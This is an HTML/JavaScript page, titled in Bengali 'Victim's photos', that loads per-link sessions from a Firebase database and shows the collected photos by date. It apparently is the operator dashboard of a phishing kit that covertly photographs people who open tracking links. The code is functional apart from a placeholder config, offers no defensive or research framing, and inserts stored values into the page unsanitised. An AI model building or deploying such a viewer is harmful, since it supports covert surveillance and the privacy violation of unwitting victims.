<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিকটিমের ছবি</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body{background:#111;color:#fff;font-family:sans-serif;padding:20px;min-height:100vh;}
    h1{text-align:center;color:#00ccff;font-size:2.2em;margin:30px 0;}
    .container{max-width:900px;margin:0 auto;}
    .session{background:#1a1a2e;border-radius:20px;padding:25px;margin:30px 0;box-shadow:0 12px 35px rgba(0,0,0,0.6);}
    .date{color:#00ff9d;font-size:1.7em;font-weight:700;margin-bottom:10px;}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;}
    .grid img{width:100%;height:240px;object-fit:cover;border-radius:16px;border:5px solid #0066ff;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,102,255,0.5);}
    .grid img:hover{transform:scale(1.06);}
    .no-photo{color:#888;font-size:1.5em;text-align:center;padding:100px 0;}
  </style>
</head>
<body>
<div class="container">
  <h1>ভিকটিমের ছবি</h1>
  <div id="content">লোড হচ্ছে...</div>
</div>

<script>
const firebaseConfig = { /* তোমার কনফিগ */ };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let id = new URLSearchParams(location.search).get('id');
if (!id) id = location.pathname.split('/').pop();

db.ref('links/' + id + '/sessions').on('value', snap => {
  const sessions = snap.val() || {};
  const div = document.getElementById('content');
  
  if (Object.keys(sessions).length === 0) {
    div.innerHTML = "<p class='no-photo'>এখনো কোনো ছবি আসেনি</p>";
    return;
  }

  let html = '';
  Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
    const s = sessions[date];
    html += `<div class="session"><div class="date">${date}</div>
      <div class="grid">${(s.photos||[]).map(src=>`<img src="${src}" onclick="window.open('${src}')">`).join('')}</div>
    </div>`;
  });
  div.innerHTML = html;
});
</script>
</body>
</html>
